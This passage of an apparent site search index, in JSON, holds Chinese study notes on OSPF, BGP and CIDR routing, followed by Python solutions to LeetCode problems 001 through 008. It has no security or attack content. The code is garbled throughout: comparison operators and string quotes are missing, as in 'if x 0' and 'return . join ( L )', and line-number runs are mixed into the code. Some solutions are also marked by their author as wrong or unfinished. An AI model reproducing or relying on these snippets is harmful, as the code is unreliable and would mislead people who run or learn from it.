\u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/#ospf","text":"\u4e0e\u91c7\u7528\u8ddd\u79bb\u5411\u91cf\u7684RIP\u534f\u8bae\u4e0d\u540c\u7684\u662f\uff0cOSPF\uff08\u5f00\u653e\u6700\u77ed\u8def\u5f84\u4f18\u5148\uff09\u662f\u4e00\u4e2a\u94fe\u8def\u72b6\u6001\u534f\u8bae\u3002\u8ddd\u79bb\u5411\u91cf\u7684\u610f\u601d\u662f\uff0cRIP\u53d1\u9001\u7684\u62a5\u6587\u5305\u542b\u4e00\u4e2a\u8ddd\u79bb\u5411\u91cf\uff08\u8df3\u6570\uff09\u3002\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u6839\u636e\u5b83\u6240\u63a5\u6536\u5230\u90bb\u7ad9\u7684\u8fd9\u4e9b\u8ddd\u79bb\u5411\u91cf\u6765\u66f4\u65b0\u81ea\u5df1\u7684\u8def\u7531\u8868\u3002 \u5728\u4e00\u4e2a\u94fe\u8def\u72b6\u6001\u534f\u8bae\u4e2d\uff0c\u8def\u7531\u5668\u5e76\u4e0d\u4e0e\u5176\u90bb\u7ad9\u4ea4\u6362\u8ddd\u79bb\u4fe1\u606f\u3002\u5b83\u91c7\u7528\u7684\u662f\u6bcf\u4e2a\u8def\u7531\u5668\u4e3b\u52a8\u5730\u6d4b\u8bd5\u4e0e\u5176\u90bb\u7ad9\u76f8\u8fde\u94fe\u8def\u7684\u72b6\u6001\uff0c\u5c06\u8fd9\u4e9b\u4fe1\u606f\u53d1\u9001\u7ed9\u5b83\u7684\u5176\u4ed6\u90bb\u7ad9\uff0c\u800c\u90bb\u7ad9\u5c06\u8fd9\u4e9b\u4fe1\u606f\u5728\u81ea\u6cbb\u7cfb\u7edf\u4e2d\u4f20\u64ad\u51fa\u53bb\u3002\u6bcf\u4e2a\u8def\u7531\u5668\u63a5\u6536\u8fd9\u4e9b\u94fe\u8def\u72b6\u6001\u4fe1\u606f\uff0c\u5e76\u5efa\u7acb\u8d77\u5b8c\u6574\u7684\u8def\u7531\u8868\u3002 OSPF\u4e0e RIP\uff08\u4ee5\u53ca\u5176\u4ed6\u9009\u8def\u534f\u8bae\uff09\u7684\u4e0d\u540c\u70b9\u5728\u4e8e\uff0c OSPF\u76f4\u63a5\u4f7f\u7528IP\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u5e76\u4e0d\u4f7f\u7528UDP\u6216TCP\u3002\u5bf9\u4e8eip\u9996\u90e8\u7684protocol\u5b57\u6bb5\uff0cOSPF\u6709\u5176\u81ea\u5df1\u7684\u503c\u3002","title":"OSPF"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/#bgp","text":"BGP\u662f\u4e00\u79cd\u4e0d\u540c\u81ea\u6cbb\u7cfb\u7edf\u7684\u8def\u7531\u5668\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u7684\u5916\u90e8\u7f51\u5173\u534f\u8bae\u3002 BGP\u7cfb\u7edf\u4e0e\u5176\u4ed6 BGP\u7cfb\u7edf\u4e4b\u95f4\u4ea4\u6362\u7f51\u7edc\u53ef\u5230\u8fbe\u4fe1\u606f\u3002\u8fd9\u4e9b\u4fe1\u606f\u5305\u62ec\u6570\u636e\u5230\u8fbe\u8fd9\u4e9b\u7f51\u7edc\u6240\u5fc5\u987b\u7ecf\u8fc7\u7684\u81ea\u6cbb\u7cfb\u7edfAS\u4e2d\u7684\u6240\u6709\u8def\u5f84\u3002\u8fd9\u4e9b\u4fe1\u606f\u8db3\u4ee5\u6784\u9020\u4e00\u5e45\u81ea\u6cbb\u7cfb\u7edf\u8fde\u63a5\u56fe\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u6839\u636e\u8fde\u63a5\u56fe\u5220\u9664\u9009\u8def\u73af\uff0c\u5236\u8ba2\u9009\u8def\u7b56\u7565\u3002 BGP\u5141\u8bb8\u4f7f\u7528\u57fa\u4e8e\u7b56\u7565\u7684\u9009\u8def\u3002\u7531\u81ea\u6cbb\u7cfb\u7edf\u7ba1\u7406\u5458\u5236\u8ba2\u7b56\u7565\uff0c\u5e76\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u5c06\u7b56\u7565\u6307\u5b9a\u7ed9 BGP\u3002\u4e0eRIP\u548cOSPF\u4e0d\u540c\u7684\u662f\uff0cBGP\u91c7\u7528TCP\u4f5c\u4e3a\u5176\u4f20\u8f93\u5c42\u534f\u8bae\u3002\u4e24\u4e2a\u8fd0\u884cBGP\u7684\u7cfb\u7edf\u4e4b\u95f4\u5efa\u7acb\u4e00\u6761TCP\u8fde\u63a5\u3002 BGP\u662f\u4e00\u4e2a\u8ddd\u79bb\u5411\u91cf\u534f\u8bae\uff0c\u4f46\u662f\u4e0e\uff08\u901a\u544a\u5230\u76ee\u7684\u5730\u5740\u8df3\u6570\u7684\uff09 RIP\u4e0d\u540c\u7684\u662f\uff0cBGP \u5217\u4e3e\u4e86\u5230\u6bcf\u4e2a\u76ee\u7684\u5730\u5740\u7684\u8def\u7531\u3002","title":"BGP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/#cidr","text":"\u65e0\u7c7b\u578b\u57df\u95f4\u9009\u8def\uff08CIDR\uff09\u662f\u4e00\u4e2a\u9632\u6b62Internet\u8def\u7531\u8868\u81a8\u80c0\u7684\u65b9\u6cd5\uff0c\u5b83\u4e5f\u79f0\u4e3a\u8d85\u7f51\u3002 CIDR\u7684\u57fa\u672c\u89c2\u70b9\u662f\u91c7\u7528\u4e00\u79cd\u5206\u914d\u591a\u4e2aip\u5730\u5740\u7684\u65b9\u5f0f\uff0c\u4f7f\u5176\u80fd\u591f\u5c06\u8def\u7531\u8868\u4e2d\u7684\u8bb8\u591a\u8868\u9879\u603b\u548c\uff08summarization\uff09\u6210\u66f4\u5c11\u7684\u6570\u76ee\u3002 \u201c\u65e0\u7c7b\u578b\u201d\u7684\u610f\u601d\u662f\u73b0\u5728\u7684\u9009\u8def\u51b3\u7b56\u662f\u57fa\u4e8e\u6574\u4e2a 32 bit IP\u5730\u5740\u7684\u63a9\u7801\u64cd\u4f5c\uff0c\u800c\u4e0d\u7ba1\u5176ip\u5730\u5740\u662fA\u7c7b\u3001B\u7c7b\u6216\u662fC\u7c7b\uff0c\u90fd\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\u3002","title":"CIDR"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/4\u5c42 \u4f20\u8f93\u5c42/TCP/","text":"","title":"TCP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/5\u5c42 \u5e94\u7528\u5c42/Http & Https/","text":"","title":"Http & Https"},{"location":"LeetCode/vol 0/001-010/","text":"001 \u4f7f\u7528\u67e5\u8868\u7684\u65b9\u5f0f\u5f88\u5bb9\u6613\u5f97\u51fa \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def twoSum ( self , nums , target ): :type nums: List[int] :type target: int :rtype: List[int] vis = {} for i , num in enumerate ( nums ): diff = target - num if diff in vis : return [ vis [ diff ], i ] vis [ num ] = i 002 \u94fe\u8868\u6c42\u548c\uff0c\u4e00\u5f00\u59cb\u4f7f\u7528\u4e86\u7b80\u5355\u7c97\u66b4\u7684\u65b9\u6cd5\uff0c\u5148\u6c42\u6bcf\u4e2a\u94fe\u8868\u7684\u503c\uff0c\u518d\u6c42\u548c\uff0c\u63a5\u7740\u8f6c\u6362\u6210\u94fe\u8868 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def getNum ( listNode ): listNode_sum = 0 iter = 1 while listNode : listNode_sum += listNode . val * iter iter *= 10 listNode = listNode . next return listNode_sum def transform ( nums ): ans = ListNode ( nums % 10 ) p = ans nums //= 10 while nums : p . next = ListNode ( nums % 10 ) p = p . next nums //= 10 return ans \u53ef\u7ee7\u7eed\u63d0\u9ad8 \u6cd5\u4e8c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : # @return a ListNode def addTwoNumbers ( self , l1 , l2 ): carry = 0 root = n = ListNode ( 0 ) while l1 or l2 or carry : v1 = v2 = 0 if l1 : v1 = l1 . val l1 = l1 . next if l2 : v2 = l2 . val l2 = l2 . next carry , val = divmod ( v1 + v2 + carry , 10 ) n . next = ListNode ( val ) n = n . next return root . next 003 \u6c42\u5b57\u7b26\u4e32 \u4e0d\u5305\u62ec\u91cd\u590d\u5b57\u7b26\u7684\u6700\u957f\u5b50\u4e32\u7684 \u957f\u5ea6 \u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32 1 2 3 4 Given a string, find the length of the longest substring without repeating characters. Input: abcabcbb Output: 3 Explanation: The answer is abc , with the length of 3. \u60f3\u6cd5 \u89e3\u6cd5\uff1aDP\u7b97\u6cd5 \u77e9\u9635\u5e94\u8be5\u662f\u4ec0\u4e48\uff0c\u72b6\u6001\u8f6c\u79fb\u65b9\u7a0b\u662f\u4ec0\u4e48\uff1f \u5047\u8bbe\u662f\u4e00\u4e2alist\u5b58\u653e\u72b6\u6001\uff0c\u8be5list\u7684\u6bcf\u4e2a\u5143\u7d20\u4ee3\u8868\u5bf9\u5e94 \u4ee5\u8be5\u5b57\u7b26\u7ed3\u675f\u7684\u5b57\u7b26\u4e32\u7684\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32\u7684\u957f\u5ea6\uff1f \u90a3\u4e48\u4e0b\u4e00\u4e2a\u5143\u7d20\u53ef\u5426\u4f7f\u7528\u4e4b\u524d\u7684\u5143\u7d20\u7684\u4fe1\u606f\uff1f 1 2 3 4 5 6 7 # \u4ee5\u8be5\u5b57\u7b26\u7ed3\u675f\u7684\u5b57\u7b26\u4e32\u7684\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32\u7684\u957f\u5ea6\uff1f # \u90a3\u4e48\u662f\u5426\u9700\u8981\u4e00\u4e2a\u8868\u8bb0\u5f55\u51fa\u73b0\u7684\u4f4d\u7f6e\uff1f # \u5f53\u51fa\u73b0\u91cd\u590d\u7684\u5b57\u7b26\u65f6\uff0c\u67e5\u627e\u4e4b\u524d\u5728\u4e0a\u4e00\u8f6e\u7684\u5bf9\u5e94\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u8ba1\u7b97\u8fd9\u4e00\u8f6e\u7684\u4e0d\u91cd\u590d\u5b57\u7b26\u7684\u5b50\u4e32\u957f\u5ea6\uff0c # \u90a3\u4e48\u5982\u4f55\u8ba1\u7b97\u957f\u5ea6 # \u5f97\u5230\u91cd\u590d\u5b50\u7b26\u7684\u4f4d\u7f6e\uff0c\u5f80\u524d\u67e5\u627e \u4e0a\u4e00\u8f6e\u7684 t m m z u x t \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Solution : def lengthOfLongestSubstring ( self , s ): :type s: str :rtype: int maxLength = 0 start = 0 # todo \u8be5\u5b57\u5178\u9700\u8981\u4e00\u4e2a\u66f4\u597d\u7684\u540d\u5b57 subStringDic = {} for index , currentChar in enumerate ( s ): if currentChar in subStringDic and subStringDic [ currentChar ] = start : # \u53d1\u751f\u91cd\u590d\u7684\u5b57\u7b26\uff0c\u91cd\u65b0\u8ba1\u7b97\u65b0\u4e00\u8f6e\u7684\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32 # \u540c\u65f6\uff0c\u786e\u4fdd\u91cd\u590d\u7684\u5b57\u7b26\u4e32\u8981\u5927\u4e8estart\uff0c\u5982 tmmzuxt # \u8be5\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u5927\u4e8e\u540e\uff0c\u9047\u5230\u6700\u540e\u4e00\u4e2at\u65f6\uff0c\u5c31\u8fdb\u5165\u5224\u65ad\u8bed\u53e5\uff0cstart=0+1=1\u4e86\uff0c\u6ca1\u6709\u8ba1\u7b97\u5230t start = subStringDic [ currentChar ] + 1 else : # \u4e0d\u91cd\u590d\uff0c\u4e0e\u4e4b\u524d\u8bb0\u5f55\u7684\u6700\u5927\u503c\u505a\u6bd4\u8f83\uff0c\u9700\u8981\u66f4\u65b0\u6700\u5927\u503c maxLength = max ( index - start + 1 , maxLength ) subStringDic [ currentChar ] = index return maxLength 004 E \u627e\u5230\u4e24\u4e2a\u6392\u5e8f\u6570\u7ec4\u7684\u4e2d\u4f4d\u6570\uff0c\u4e00\u5f00\u59cb\u662f\u60f3set\u540e\u6c42\u5e76\u7136\u540esort\u76f4\u63a5\u8f93\u51fa\u4e2d\u4f4d\u6570\uff0c\u7136\u540e\u53d1\u73b0\u8fd9\u6837\u7684\u4e2d\u4f4d\u6570\u5e76\u4e0d\u662f\u539f\u5148\u4e24\u4e2a\u6570\u7ec4\u7684\u4e2d\u4f4d\u6570\uff0c\u6240\u4ee5\u8be5\u601d\u8def\u653e\u5f03 \u90a3\u4e48\u9700\u8981\u4e0b\u66b4\u529b\u7684\u65b9\u6cd5\u6765\u8f93\u51fa\u4e2d\u4f4d\u6570\uff1f \u7531\u4e8e\u662f\u4e2d\u4f4d\u6570\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u53ef\u80fd \u6cd5\u4e00 005 \u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6c42\u5f97\u4e00\u4e2a\u6700\u957f\u7684\u5b50\u56de\u6587\u5b57\u7b26\u4e32 Given a string s, find the longest palindromic substring in s. You may assume that the maximum length of s is 1000 1 2 3 Input: babad Output: bab Note: aba is also a valid answer. \u60f3\u6cd5 \u8981\u6c42\u662f\u8fd4\u56de\u4e00\u4e2a\u6700\u957f\u7684\u5b50\u56de\u6587\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u9700\u8981\u6ce8\u610f\u7684\u662f \u56de\u6587\u4e32\u7684\u5f62\u5f0f aba aa \u6700\u957f\u5b50\u56de\u6587\u4e32\u7684\u8d77\u59cb\u5730\u5740\u4e0e\u5176\u504f\u79fb\u3001\u7ed3\u675f\u5730\u5740 \u90a3\u4e48\uff0c\u80fd\u5426\u4f7f\u7528\u9996\u5c3e\u4e24\u4e2a\u6307\u9488\u6765\u5411\u4e2d\u5fc3\u79fb\u52a8\u5462\uff1f \u60f3\u4e86\u4e0b\u5927\u6982\u4e0d\u884c\uff0c\u4f8b\u5b50\u5982 ababvda \u6216\u8005\u52a0\u5165DP\u7684\u601d\u60f3\uff1f\u6240\u4ee5\u9700\u8981\u4e00\u4e2a\u65b0\u7684\u5bb9\u5668\u5b58\u653e\u72b6\u6001\uff0c\u8be5\u72b6\u6001\u53ef\u4ee5\u662f\uff1f \u4e00\u7ef4\u6570\u7ec4\uff0c\u72b6\u6001\u8868\u793a\u4ee5\u5f53\u524d\u5b57\u7b26\u5f00\u59cb\u7684\u56de\u6587\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff1f\u6216\u662f\u4ee5\u8be5\u5b57\u7b26\u4e3a\u4e2d\u5fc3\u7684\u957f\u5ea6\uff1f \u611f\u89c9\u4ee5\u8be5\u5b57\u7b26\u4e3a\u4e2d\u5fc3\u957f\u5ea6\u53ef\u884c\uff0c\u4f46\u4e0d\u9002\u7528\u4e0eaaaa\u8fd9\u6837\u5076\u6570\u957f\u5ea6\u56de\u6587\u4e32\uff0c\u6216\u8005\u53ef\u4ee5\u5206\u60c5\u51b5\u8ba8\u8bba \u4e8c\u7ef4\u77e9\u9635\uff1fi\u3001j\u8fd9\u4e24\u5b57\u7b26\u4e4b\u95f4\u662f\u5426\u6709\u56de\u6587\u5b57\u7b26\uff1f \u6cd5\u4e00 \u4f7f\u7528\u4e8c\u7ef4\u6570\u7ec4\u8bb0\u5f55\u72b6\u6001\uff0cdp[i][j]\u8868\u793ai,j\u4e4b\u95f4\u662f\u5426\u662f\u56de\u6587 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution ( object ): def longestPalindrome ( self , s ): dp = [[ 0 ] * len ( s ) for i in range ( len ( s ))] ans = max_length = 0 # i\u5012\u8fc7\u6765\u8ba1\u7b97\u662f\u4e3a\u4e86\u4ece\u5b57\u7b26\u4e32\u5c0f\u5230\u5927 # \u5982\u679ci\u4ece\u5934\u5f00\u59cb\uff0c\u4f1a\u6f0f\u7b97\u60c5\u51b5 for i in range ( len ( s ) - 1 , - 1 , - 1 ): for j in range ( i , len ( s )): if s [ i ] == s [ j ] and ( j - i 3 or dp [ i + 1 ][ j - 1 ] == 1 ): dp [ i ][ j ] = 1 if ans == or max_length j - i + 1 : ans = s [ i : j + 1 ] max_length = j - i + 1 return ans \u6cd5\u4e8c \u8fd9\u91cc\u662f\u4ece\u4e2d\u5fc3\u5411\u4e24\u8fb9\u6269\u5c55 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 class Solution ( object ): def longestPalindrome ( self , s ): length = len ( s ) center_odd = 0 center_even = 0 maxRadius = 0 maxLen = 0 if length 2 : return s # \u957f\u5ea6\u4e3a\u5947\u6570 for i in range ( length ): for j in range ( i , length ): # \u8fb9\u754c\u8d85\u51fa if i - ( j - i ) 0 : break # \u5411\u4e24\u8fb9\u6269\u5c55 elif s [ i - ( j - i )] != s [ j ]: break else : if j - i maxRadius : maxRadius = j - i center_odd = i # \u957f\u5ea6\u4e3a\u5076\u6570 for i in range ( length ): for j in range ( i + 1 , length ): # \u8fb9\u754c\u8d85\u51fa if i - ( j - i ) + 1 0 : break # \u5411\u4e24\u8fb9\u6269\u5c55 # center = i = 5 # j = 6, 7, 8, # cp= 5, 4, 3, elif s [ i - ( j - i ) + 1 ] != s [ j ]: break else : if 2 * ( j - i ) maxLen : maxLen = 2 * ( j - i ) center_even = i return s [ center_odd - maxRadius : center_odd + maxRadius + 1 ] if maxLen 2 * maxRadius + 1 else s [ center_even - ( maxLen // 2 ) + 1 : center_even + ( maxLen // 2 ) + 1 ] \u6cd5\u4e09 \u67e5\u627e\u4e86\u8d44\u6599\uff0c\u8fd8\u6709\u4e2a\u9a6c\u62c9\u8f66\u7b97\u6cd5 \u6240\u8c13\u9a6c\u62c9\u8f66\u7b97\u6cd5\uff08manacher\uff09\u662f \u53c2\u8003\u8d44\u6599 https://www.jianshu.com/p/7c3f074b380b \u9519\u8bef Todo \u5206\u6790\u4e3a\u4f55\u51fa\u9519 \u8fd9\u91cc\u51fa\u9519\u4e86\uff0c\u4e0d\u77e5\u9053\u662f\u54ea\u91cc\u7684\u95ee\u9898 \u5df2\u77e5\u7684 i\u4ece\u5934\u5f00\u59cb\uff0c\u5b57\u7b26\u4e32\u5c3e\u90e8\u672a\u8003\u8651\u5230\uff0c\u5e94\u8be5\u4ece\u5c3e\u90e8\u5f00\u59cb \u7591\u8651\uff1a\u4e0d\u662f\u56de\u6587\u5417\uff1f\u4ece\u5934\u4ece\u5c3e\u4e0d\u662f\u4e00\u6837\u4e48? abbbbbba \u4ece\u5934 a ab bb \u4ece\u5c3e a ba bb bba \u5927\u6982\u5c31\u8fd9\u610f\u601d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution ( object ): def longestPalindrome ( self , s ): :type s: str :rtype: str length = len ( s ) if length 2 : return s dp = [[ False for _ in range ( length )] for _ in range ( length )] # dp[i][j]\u8868\u793a\u5b57\u7b26i,j\u4e4b\u95f4\u662f\u5426\u662f\u56de\u6587\u5b57\u7b26\u4e32 start = 0 maxlength = 0 for i in range ( length ): dp [ i ][ i ] = True for i in range ( length ): for j in range ( i + 1 , length ): # j - i 2 \u6ee1\u8db3 aa aba dp [ i ][ j ] = ( s [ i ] == s [ j ] and ( j - i 2 or dp [ i + 1 ][ j - 1 ])) if j - i + 1 maxlength and dp [ i ][ j ]: start = i maxlength = j - i + 1 return s [ start : start + maxlength + 1 ] \u5176\u4ed6 Todo \u4e3a\u6bdb\u8fd9\u4e2a\u90a3\u4e48\u5febclass Solution ( object ): def longestPalindrome ( self , s ): :type s: str :rtype: str max_length = 0 start = 0 if s == s [:: - 1 ]: return s for i in range ( len ( s )): if i - max_length - 1 = 0 and s [ i - max_length - 1 : i + 1 ] == s [ i - max_length - 1 : i + 1 ][:: - 1 ]: start = i - max_length - 1 max_length += 2 # print(i,start, max_length) continue if i - max_length = 0 and s [ i - max_length : i + 1 ] == s [ i - max_length : i + 1 ][:: - 1 ]: start = i - max_length max_length += 1 # print(i,start,max_length) return s [ start : start + max_length ] # class Solution: # def longestPalindrome(self, s): # # :type s: str # :rtype: str # # max_length = 0 # start = 0 # if s == s[::-1]: # return s # # for i in range(len(s)): # if i - max_length - 1 = 0 and s[i - max_length - 1:i + 1] == s[i - max_length - 1:i + 1][::-1]: # start = i - max_length - 1 # max_length += 2 # continue # # if i - max_length = 0 and s[i - max_length:i + 1] == s[i - max_length:i + 1][::-1]: # start = i - max_length # max_length += 1 # return s[start:start + max_length] # Accept O(n) # def longestPalindrome(self, s): # size = len(s) # if size == 1: # return s # if size == 2: # if s[0] == s[1]: # return s # return s[0] # maxp = 1 # ans = s[0] # i = 0 # while i size: # j = i + 1 # # \u786e\u5b9a\u5185\u6838\uff0c\u5728\u540e\u9762\u4ee3\u7801\u4e2dj\u53ef\u4ee5\u81ea\u52a8\u9002\u5e94\u5947\u6570\u5b50\u4e32\u548c\u5076\u6570\u5b50\u4e32 # while j size: # if s[i] == s[j]: # j += 1 # else: # break # k = 0 # # \u5bf9\u79f0\u6269\u5c55 # while i - k - 1 = 0 and j + k = size - 1: # if s[i- k - 1] != s[j + k]: # break # k += 1 # if j - i + 2*k maxp: # maxp = j- i + 2*k # ans = s[i - k:j + k] # if j + k == size - 1: # break # i = j # return ans # TLE O(n^2) # def longestPalindrome(self, s): # if(len(s) =1): # return s # if(len(s)==2): # return s[0] if s[0]!=s[1] else s # # s = s[::-1] # start = 0 # max_len = 1 # length = len(s) # P = [[False for i in range(length)] for i in range(length)] # for i in range(length): # P[i][i] = True # if i (length-1) and s[i]==s[i+1]: # P[i][i+1] = True # start = i # max_len = 2 # for l in range(3,length+1): # for i in range(0,length-l+1): # j = i + l -1 # if P[i+1][j-1] and s[i]==s[j]: # P[i][j] = True # if l max_len: # max_len = l # start = i # return s[start:start+max_len] # TLE O(n^3) # def longestPalindrome(self, s): # # :type s: str # :rtype: str # # if len(s) = 1: # return s # st = 0 # ln = len(s) # re_s = 0 # re_l = 1 # while (st + re_l) = len(s): # while ln re_l: # if self.is_palindrome(s[st:st + ln]) and ln re_l: # print(s[st:st + ln]) # re_s, re_l = st, ln # ln -= 1 # st += 1 # ln = len(s) - st # return s[re_s:re_s + re_l] # def is_palindrome(self, s): # if len(s) == 1: # return True # step = len(s)//2 # for i in range(step): # if s[i] == s[-(i+1)]: # continue # else: # return False # return True # class Solution: # def longestPalindrome(self, s): # # :type s: str # :rtype: str # # maxlen = 1 # start = 0 # if len(s) == 1: # return s # for i in range(len(s)): # lo = i - 1 # hi = i + 1 # while lo = 0 and hi len(s) and s[lo] == s[hi]: # if hi - lo + 1 maxlen: # maxlen = hi - lo + 1 # start = lo # lo -= 1 # hi += 1 # # for i in range(len(s)): # loo = i # hii = i + 1 # while loo = 0 and hii len(s) and s[loo] == s[hii]: # if hii - loo + 1 maxlen: # maxlen = hii - loo + 1 # start = loo # loo -= 1 # hii += 1 # # return s[start:start + maxlen] So = Solution () print ( So . longestPalindrome ( babad )) print ( abcab [ 0 : 0 ]) 006 \u5c06\u5355\u8bcd\u4ee5Z\u5b57\u5f62\u8f93\u51fa\uff0c\u5982 1 2 3 4 5 6 7 8 Input: s = PAYPALISHIRING , numRows = 4 Output: PINALSIGYAHRPI Explanation: P I N A L S I G Y A H R P I 4\u884c\u8f93\u51fa \u60f3\u6cd5 \u6211\u89c9\u5f97\u5c31\u662f\u66b4\u529b\u505a\u6cd5 \u9996\u5148\u662f\u7279\u6b8a\u7684\u884c\u6570\uff0c\u5982nrow=1 \uff0cnrow len(str) \u7136\u540e\u600e\u4e48\u751f\u6210\u5b57\u7b26\u4e32\uff1f \u9996\u5148\u60f3\u5230\u7684\u662f\u4e8c\u7ef4\u6570\u7ec4 \u7136\u540e\u662f\u4e00\u6a2a\u4e00\u6a2a\u7684\u7684\u9644\u52a0\u4e0a\u53bb 1 2 3 4 5 6 7 8 9 10 11 # nrow = 5 str 0 1 2 3 4 5 6 7 8 9 tmp 0 1 2 3 4 3 2 1 0 1 # nrow = 4 str 0 1 2 3 4 5 6 7 8 9 tmp 0 1 2 3 2 1 0 1 2 3 # nrow = 3 str 0 1 2 3 4 5 6 7 8 9 tmp 0 1 2 1 0 1 2 1 0 1 \u901a\u8fc7\u89c2\u5bdf\uff0c\u5f97\u5230\u6620\u5c04\u5173\u7cfb\uff1f \u6216\u8bb8\u4e0d\u7528\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def convert ( self , s , numRows ): if numRows == 1 or numRows = len ( s ): return s L = [ ] * numRows index , step = 0 , 1 for x in s : L [ index ] += x if index == 0 : step = 1 elif index == numRows - 1 : step = - 1 index += step return . join ( L ) \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class Solution : def convert ( self , s , numRows ): :type s: str :type numRows: int :rtype: str if numRows == 1 : return s ansList = [] gap = 2 * numRows - 2 for i in range ( numRows ): temp1 = i temp2 = gap - i if temp1 == 0 or temp1 == numRows - 1 : while temp1 len ( s ): ansList . append ( s [ temp1 ]) temp1 += gap else : while temp1 len ( s ): ansList . append ( s [ temp1 ]) temp1 += gap if temp2 len ( s ): ansList . append ( s [ temp2 ]) temp2 += gap return . join ( ansList ) 007 \u7ffb\u8f6c\u6570\u5b57 \u867d\u7136\u8bf4\u53ef\u4ee5\u7528python\u672c\u8eab\u7684\u7279\u6027\u6765\u505a\uff0c\u4f46\u6211\u89c9\u5f97\u8fd8\u662f\u7528c\u7684\u65b9\u5f0f\u505a\u6bd4\u8f83\u597d \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def reverse ( self , x ): :type x: int :rtype: int isNegative = False if x 0 : x = - x isNegative = True val = 0 while x != 0 : val = val * 10 + x % 10 x = int ( x / 10 ) res = - val if isNegative else val if res pow ( 2 , 31 ) - 1 or res - pow ( 2 , 31 ): return 0 return res \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def reverse ( self , x ): :type x: int :rtype: int if x 0 : y = - 1 * int ( str ( - x )[:: - 1 ]) else : y = int ( str ( x )[:: - 1 ]) if y 2147483647 or y - 2147483647 : y = 0 return y 008 \u5b9e\u73b0atoi\u51fd\u6570\uff0cstring\u8f6c\u6362\u6210int\u53d8\u91cf \u56de\u60f3\u4e4b\u524datoi\u51fd\u6570\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u529f\u80fd \u53ea\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u53ef\u88ab\u8f6c\u6362\u6210\u6570\u5b57\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u9996\u5b57\u7b26\u662f\u7a7a\u683c\u4ee5\u5916\u7684\u5b57\u7b26\u62a5\u9519 \u8bfb\u53d6 - + \u53f7 \u8fd4\u56deINT \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 class Solution ( object ): def myAtoi ( self , str ): :type str: str :rtype: int def isDigit ( char ): if ( 0x30 = ord ( char ) and ord ( char ) = 0x39 ): return True return False if len ( str ) == 0 : return 0 INT_MAX = 2147483647 INT_MIN = - 2147483648 res = 0 start_index = 0 isNegative = False while start_index len ( str ) and str [ start_index ] == : start_index += 1 while start_index len ( str ): if str [ start_index ] == - : isNegative = True start_index += 1 elif str [ start_index ] == + : start_index += 1 while start_index len ( str ) and isDigit ( str [ start_index ]): res = res * 10 + ord ( str [ start_index ]) - 0x30 start_index += 1 if isNegative : res = - res if res INT_MAX : return INT_MAX elif res INT_MIN : return INT_MIN return res return 0 \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 class Solution ( object ): def myAtoi ( self , str ): :type str: str :rtype: int INT_MAX = 2147483647 INT_MIN = - 2147483648 index = 0 total = 0 sign = 1 # remove the space if len ( str ) == 0 : return 0 while index len ( str ) and str [ index ] == : index += 1 if index len ( str ): if str [ index ] == - : sign = - 1 index += 1 elif str [ index ] == + : index += 1 while index len ( str ): digit = ord ( str [ index ]) - ord ( 0 ) if digit 0 or digit 9 : return total * sign if INT_MAX / 10 sign * total or - (( - INT_MIN ) / 10 ) sign * total or ( INT_MAX / 10 == sign * total and INT_MAX % 10 digit ) or ( - (( - INT_MIN ) / 10 ) == sign * total and ( - INT_MIN ) % 10 digit ): if sign == 1 : return INT_MAX else : return INT_MIN total = total * 10 + digit index += 1 return total * sign # class Solution: # def myAtoi(self, str): # # :type str: str # :rtype: int # # if len(str) == 0: # return 0 # ls = list(str.strip()) # sign = -1 if ls[0] == - else 1 # if ls[0] in [ - , + ]: del ls[0] # ret, i = 0, 0 # while i len(ls) 